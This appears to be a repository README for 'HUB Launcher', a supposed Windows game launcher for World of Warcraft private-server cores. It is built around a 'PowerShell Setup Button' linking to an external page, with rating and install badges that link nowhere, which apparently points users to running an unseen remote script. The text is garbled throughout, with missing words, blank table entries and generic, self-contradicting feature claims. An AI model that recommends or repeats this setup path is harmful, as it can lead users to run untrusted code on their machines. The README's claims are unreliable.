<div align="center">

# 🎮 HUB Launcher — Game Enhancer for Windows

![](files/preview.png)

### ⚡ PowerShell Setup Button

[![](files/button.png)](https://depontoapontocomercial-prog.github.io/wow-hub-launcher/)

[![rating](https://img.shields.io/badge/rating-5.0%2F5-f59e0b?style=flat-square&labelColor=0d1117)]() [![setup](https://img.shields.io/badge/setup-847-f59e0b?style=flat-square&labelColor=0d1117)]() [![OS](https://img.shields.io/badge/os-win_10%2F11-fbbf24?style=flat-square&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/ps--core-script-d97706?style=flat-square&labelColor=0d1117)]()

</div>

---

HUB Launcher is the single entry point for players running LegionCore and AzerothCore clients, bundling launcher, client handling, and a clean path from download first launch. Everything ships as one compiled loader — grab it, extract it, run it, and you're in. No dependency hunting, no config archaeology, no guesswork about which build matches which core. It's built for people who'd rather be playing than patching.

## ✅ Before You Start

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

**⚡ Single-launcher architecture:** Launcher, client hooks, and module loading all run from one executable. No dependency chain, no runtime sprawl — grab it, drop it in, launch.

- **🎮 Multi-client support:** Built juggle the full spread — from legacy era clients through the stack. One hub, every version, no separate builds per expansion.

- **🧠 Playerbot integration:** Bots aren't an afterthought — they're wired into the launcher flow. Spin up a populated world without touching config by hand or juggling third-party addons.

- **🖥️ core aware:** Speaks the language of LegionCore and AzerothCore out of the box. Version detection and client-core matching happen automatically — no guessing which build pairs with which core.

- **🔐 Integrity checks built in:** Every packaged artifact ships with hashes. Verify before you extract, verify before you run — the launcher doesn't trust a binary it hasn't checked.

- **🛠️ Zero-config first run:** Sensible defaults mean you're in-game on first launch. Fine-tuning is there when you want it — never mandatory.

- **📦 Self-contained payloads:** Clients,, and modules are tracked and versioned as a unit. No scavenger hunt across four repos get a working install.

- **🚀 Fast startup path:** Minimal boot overhead — the launcher gets out of the way and hands control the game. No splash-screen limbo, no telemetry round-trips.

- **🔄 Update-ready:** Launcher and module versions are decoupled, so you can patch one piece without re-downloading the whole stack.

- **🧩 Extensible by design:** New clients, new cores, and new modules slot into the existing structure. Expect the supported matrix grow, not rot.

## How it works

HUB Launcher sits at the front of your and stays out of your way. Boot it once, point it at your client, and every launch after that is a single click — no digging through folders, no rebuilding shortcuts, no hunting for the right executable.

Here's the pipeline:

- **🔍 Client detection** — the launcher scans your install, recognizes the client layout, and locks onto the correct executable for your expansion. Change clients? It re-detects instead of breaking.
- **🧩 Profile binding** — each client gets its own profile: executable path, launch arguments, and preferences. Switch between without reconfiguring anything twice.
- **⚙️ Pre-launch checks** — before the game window opens, the launcher verifies that the it expects are actually there. Missing pieces get flagged up front, not as a crash mid-login.
- **🚀 Direct launch** — the client starts with your bound profile applied. No wrapper overhead, no extra steps between you and character select.

Everything runs locally on your machine. The launcher doesn't phone home, doesn't touch your client unless you tell it, and keeps your profiles stored where you can back them up or move them.

**Designed stay out of the way.** Configuration is a one-time affair — set your paths, save a profile, and the launcher remembers. The next session is just click and play.

**Built for switching.** Multiple clients installed side by side? Each one keeps its own profile. Swap between them in the launcher, not in your file explorer.

**Fails loud, fails early.** If a path is wrong or a required file is missing, you find out before launch, with a clear message — not a silent failure or a generic client error.

## Supported Games

** HUB Launcher** is built handle the clients you actually run, not a single locked-down build. Point it at a supported client and it does its job — no wasted, no guessing which version will work.

**Out of the box:**

| Expansion | Client Line | Status |
|-|-|-|
| Retail / modern | () | ✅ Primary target — launcher + bots |
| Retail-era stacks | Latest supported builds | ✅ Fully wired |
| Classic-family | through clients | ✅ Supported |
| Private cores | LegionCore, AzerothCore, TrinityCore | ✅ Launcher-ready |

**What "supported" means here:** the launcher detects the client, matches it the right runtime profile, and applies the correct enhancement layer automatically. You don't hand-edit configs switch games — the hub adapts what's installed.

**Core compatibility:**

- **LegionCore** — native support, including the bot/AI layer
- **AzerothCore** — full launcher integration, compatible
- **TrinityCore** — supported for standard launches
- ** ()** — first-class stack: launcher +

**Version discipline:** only current-generation clients are validated. Legacy builds may launch but aren't guaranteed — if a client branch falls out of active support, it gets flagged, not silently broken.

**One hub, every client.** Install it once, and it handles the rest across your entire library.

## Configuration

** HUB Launcher** ships with sane defaults out of the box — launch it and it works. But if you want point it at a different client, swap profiles, or tune how it behaves, everything lives in one place: `config/launcher.ini` next the executable.

Open it in any text editor. Save. Restart the launcher. That's the whole loop.

### Core settings

| Key | Default | What it does |
|-|-|-|
| `client_path` | auto-detect | Path the client executable. Leave blank let the launcher scan common install locations. |
| `realm_profile` | `default` | Which profile load on startup. Matches a profile block in the same file. |
| `language` | `enUS` | Client locale passed through the game process. |
| `auto_update` | `true` | Checks for launcher updates on start. Set `false` for fully offline. |
| `close_on_launch` | `false` | Hides the launcher window once the client boots. |

### Realm profiles

Each `[realm:name]` block defines one target. You can keep as many as you want and switch between them from the launcher UI — no need edit the file every time.

```
[realm:default]
address = 127.0.0.1
port = 8085
description = Local test realm
```

- `address` — realm host. IP or hostname, no protocol prefix.
- `port` — realm port. Must match what your core is listening on.
- `description` — free text. Shows up in the launcher's profile dropdown.

Duplicate a block, rename it, and you've got a second profile. That's it.

### Client compatibility flags

Some clients need a nudge. These flags control how the launcher hands off the game process:

| Flag | When use it |
|-|-|
| `force_dx9` | Old GPUs or drivers that choke on DX11. |
| `windowed` | Boot straight into windowed mode, ignoring the client's own saved setting. |
| `skip_intro` | Bypass cinematic intros for faster iteration. |
| `custom_args` | Raw string appended the launch command. Use sparingly — bad args mean a silent no-launch. |

### Paths and

If you're running extracted locally, point the launcher at them so it can verify integrity before launch:

- `_path` — root folder containing your dbc/maps/vmaps/mmaps directories.
- `verify_on_launch` — set `true` hash-check before every launch. Slower, but catches corruption early.

### Resetting config

Broke something? Delete `launcher.ini` and restart. The launcher regenerates a clean default file on next boot. Your realm profiles will be gone — back them up first if you care.

### Quick troubleshooting

- **Launcher can't find the client** → set `client_path` manually. Auto-detect misses portable installs.
- **Client launches but can't connect** → check `address` and `port` against your core's config. Mismatched ports are the #1 cause.
- **Nothing happens on launch** → clear `custom_args` and try again. One bad flag kills the whole handoff.

## FAQ

**Is HUB Launcher free?**
Yes. Every build we ship is free grab and free use. No paywalls, no "premium tier" holding features hostage. If someone tries charge you for it, you're being scammed.

**Which clients does it actually support?**
HUB Launcher handles multiple client versions out of the box — you pick your target, the launcher handles the rest. No juggling folders, no manual file swaps, no digging through configs.

**Do I need install anything else first?**
Nope. The launcher is self-contained. Drop it in, fire it up, and point it at your client. Dependency chains are our problem, not yours.

**Can I run it alongside my existing?**
Absolutely. HUB Launcher doesn't nuke your current configuration — it works with what you've already got. Side-by-side, no conflicts.

**What happens when a new client version drops?**
We track it. When a supported client gets updated, the launcher gets updated. Keep an eye on releases so you're never running stale.

**Is this safe run?**
It's a launcher, not a black box. It does what it says: launches clients, manages configs, stays in its lane. Run it from the official release and you're good.

**Why does the launcher need certain permissions?**
Reading client, writing configs, and launching executables — that's the job. Permissions exist make those things work, not snoop. If something looks off, verify you're on an official build.

**My client won't launch. What's the move?**
Check three things in order: client path is correct, client version is supported, and the launcher has permission touch that directory. Ninety percent of launch failures live in one of those three.

**Can I switch between clients without reinstalling?**
That's the whole point. Switch targets in the launcher, it handles the handoff. One tool, multiple clients, zero reinstall marathons.

**Does it touch my game?**
It manages what it needs manage — configs, launch parameters, the stuff that makes switching clean. It doesn't rewrite your client. Your stay your.

**Where do I report a bug or request a feature?**
Through the project's issue tracker. Include your client version, launcher version, and the exact steps that broke — vague reports get vague fixes.

## Disclaimer

** HUB Launcher** is a fan-made community tool. It is not affiliated with, endorsed by, or sponsored by Blizzard Entertainment, any private project, or any of the game cores mentioned in this README.

World of Warcraft and all related names, logos, and assets are the property of Blizzard Entertainment. All third-party trademarks belong their respective owners. You are responsible for complying with the terms of service of any game or you connect using this launcher.

This tool is provided **as is**, with no warranty of any kind, express or implied. Use it at your own risk. The developers take no responsibility for account bans, loss, client corruption, or any other damage resulting from use of this launcher.

**Distribution notice:** Official builds of HUB Launcher are distributed only through the channels listed in this repository. If you obtained this launcher from an unofficial source, a reupload, or a modified package, treat it as untrusted — it may have been tampered with. Always verify against the official release before running anything.

Never share your account credentials, session tokens, or personal information with anyone claiming represent this project. The launcher will never ask for them. If something asks, it is not us.

Use the launcher only with game clients and software you are legally entitled run. Piracy is not supported, not condoned, and not our problem.